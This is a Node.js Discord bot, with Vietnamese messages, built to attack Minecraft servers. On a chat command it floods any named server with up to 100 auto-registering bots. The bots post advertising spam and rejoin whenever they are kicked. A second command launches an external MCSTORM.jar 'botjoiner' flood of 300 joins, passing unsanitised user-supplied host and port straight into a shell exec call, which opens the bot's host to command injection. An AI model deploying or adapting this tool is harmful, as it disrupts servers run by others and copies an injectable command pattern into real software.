const { Client, GatewayIntentBits } = require('discord.js');
const mineflayer = require('mineflayer');
const { exec } = require('child_process');
require('dotenv').config();

const discordBot = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ]
});

const userBots = {};
const activeIntervals = {};

function createBot(userId, host, port, botIndex = 1) {
    if (!userBots[userId]) {
        userBots[userId] = [];
    }

    const botName = `SpamBot_${botIndex}`;
    console.log(`Đang tạo bot ${botName} vào ${host}:${port}...`);

    const bot = mineflayer.createBot({
        host: host,
        port: parseInt(port),
        username: botName
    });

    userBots[userId].push(bot);

    bot.on('login', () => {
        console.log(`✅ ${botName} đã vào server ${host}:${port}.`);

        setTimeout(() => {
            bot.chat("/register sexgay69 sexgay69");
            bot.chat("/l sexgay69");
        }, 2000);

        setTimeout(() => {
            bot.chat("OP!");
            bot.chat("Follow my channel!");
            bot.chat("@_thanhtruc.210_");
        }, 3000);
    });

    bot.on('kicked', reason => {
        console.log(`❌ ${botName} bị kick: ${reason}`);
        setTimeout(() => {
            if (userBots[userId].includes(bot)) {
                createBot(userId, host, port, botIndex);
            }
        }, 5000);
    });

    bot.on('error', err => {
        console.log(`⚠️ Lỗi ${botName}: ${err}`);
    });

    return bot;
}

discordBot.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const args = message.content.split(" ");

    switch (args[0]) {
        case "!mc":
            switch (args[1]) {
                case "spam":
                    if (args.length < 4) {
                        return message.reply("⚠️ **Cách dùng:** `!mc spam <host> <port>`");
                    }
                    const host = args[2];
                    const port = args[3];
                    message.reply(`✅ **Bắt đầu spam bot vào ${host}:${port}...**`);

                    let botIndex = 1;
                    activeIntervals[message.author.id] = setInterval(() => {
                        if (!userBots[message.author.id]) userBots[message.author.id] = [];
                        if (userBots[message.author.id].length >= 100) return;
                        createBot(message.author.id, host, port, botIndex);
                        botIndex++;
                    }, 7000);
                    break;

                case "stop":
                    if (userBots[message.author.id]) {
                        userBots[message.author.id].forEach(bot => bot.quit());
                        userBots[message.author.id] = [];
                    }
                    if (activeIntervals[message.author.id]) {
                        clearInterval(activeIntervals[message.author.id]);
                        delete activeIntervals[message.author.id];
                    }
                    message.reply("**Đã dừng spam bot!**");
                    break;

                case "botjoiner":
                    if (args.length < 5) {
                        return message.reply("⚠️ **Cách dùng:** `!mc botjoiner <host> <port> <protocol>`");
                    }
                    const joinHost = args[2];
                    const joinPort = args[3];
                    const protocol = args[4];

                    message.reply(`✅ **Đang chạy botjoiner với ${joinHost}:${joinPort}...**`);

                    exec(`java -jar MCSTORM.jar ${joinHost}:${joinPort} botjoiner 300 5000`, 
                    (error, stdout, stderr) => {
                        if (error) {
                            console.error(`Perfect`);
                            message.reply(`Perfect`);
                            return;
                        }
                        if (stderr) {
                            console.error(`⚠️`);
                        }
                        console.log(`✅ Botjoiner chạy thành công: ${stdout}`);
                        message.reply("✅ **Botjoiner đang chạy!**");
                    });
                    break;

                case "help":
                    message.reply(
                        "**Lệnh Bot Minecraft:**\n" +
                        "`!mc spam <host> <port>` - Spam bot vào server\n" +
                        "`!mc stop` - Dừng spam bot\n" +
                        "`!mc botjoiner <host> <port> <protocol>` - Chạy botjoiner\n" +
                        "`!mc help` - Xem danh sách lệnh"
                    );
                    break;

                default:
                    message.reply("⚠️ **Lệnh không hợp lệ!** Gõ `!mc help` để xem danh sách lệnh.");
                    break;
            }
            break;
    }
});

discordBot.once('ready', () => {
    console.log(`✅ Bot Discord đã chạy với tên ${discordBot.user.tag}`);
});

discordBot.login(process.env.TOKEN);

